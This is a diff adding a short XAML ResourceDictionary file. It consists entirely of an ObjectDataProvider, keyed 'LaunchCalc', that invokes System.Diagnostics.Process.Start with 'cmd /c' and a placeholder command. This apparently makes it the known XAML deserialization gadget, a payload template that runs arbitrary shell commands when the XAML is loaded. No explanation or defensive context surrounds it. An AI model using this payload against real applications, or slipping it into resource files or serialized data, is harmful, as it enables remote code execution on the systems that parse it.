@@ -1,0 +1,12 @@
+<ResourceDictionary
+    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+    xmlns:System="clr-namespace:System;assembly=mscorlib"
+    xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system">
+    <ObjectDataProvider x:Key="LaunchCalc" ObjectType = "{ x:Type Diag:Process }" MethodName = "Start" >
+        <ObjectDataProvider.MethodParameters>
+            <System:String>cmd</System:String>
+            <System:String>/c "%CMD%"</System:String>
+        </ObjectDataProvider.MethodParameters>
+    </ObjectDataProvider>
+</ResourceDictionary>
